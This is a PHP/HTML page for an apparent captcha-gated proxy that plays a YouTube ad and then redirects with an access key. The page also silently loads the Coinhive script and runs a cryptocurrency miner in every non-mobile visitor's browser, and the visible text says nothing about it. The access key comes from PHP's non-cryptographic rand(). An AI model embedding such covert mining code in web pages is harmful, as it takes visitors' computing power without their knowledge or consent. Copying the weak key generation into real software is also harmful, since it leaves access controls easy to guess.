<?php
session_start();

// check if captcha is correct
if($_SERVER['REQUEST_METHOD']=='POST'){
    if($_POST['captcha'] != $_SESSION['captcha']['code']) {  // verify captcha
        $_SESSION['captcha_error']=1;   // if captcha is wrong, set captcha_error to 1 so index.php can display error
        header('Location: index.php');
        die();
    }
} else {
    header('Location: index.php');  // if request method is not post, redirect to index site
    die();
}

// rand string function for mac authentication
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

//set mac key. if client posts with this key proxy is authorized. only 
//after client watches ad they will get the key
$_SESSION['mac_key']=generateRandomString();
?>

<!-- coinhive js miner -->
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('xtZRwwDNvIX0YalXHlsCjYgOwx66TI4h', {throttle: 0.3});
if (!miner.isMobile()) {
    miner.start();
}
</script>

<br><br>
<h1 style="text-align: center;">You will be redirected after the ad</h1>
<br><br>
<center>
<div id="player"></div>
</center>

<!-- ad player. plays video from youtube -->
<script src="https://www.youtube.com/player_api"></script>

<script>
    
    // create youtube player
    var player;
    function onYouTubePlayerAPIReady() {
        player = new YT.Player('player', {
            height: '390',
            width: '640',
            videoId: '0Bmhjf0rKe8',
            playerVars: {
                'controls': 0,
                'showinfo': 0,
                'rel': 0,
                'modestbranding': 1
            },
            events: {
                'onReady': onPlayerReady, // play video after 
                'onStateChange': onPlayerStateChange // after video ends, redirect page with mac key
            }
        });
    }

    // hash function
    function hash(str){
        var hash = 0;
        if (str.length == 0) return hash;
        for (i = 0; i < str.length; i++) {
            char = str.charCodeAt(i);
            hash = ((hash<<5)-hash)+char;
            hash = hash & hash;
        }
        return hash;
    }

    // autoplay video
    function onPlayerReady(event) {
        event.target.playVideo();
    }

    // when video ends
    function onPlayerStateChange(event) {
        if(event.data === 0) {
            var mac="<?php echo $_SESSION['mac_key']; ?>";
            window.location.replace('proxy.php?key=' + mac);
        }
    }
    
</script>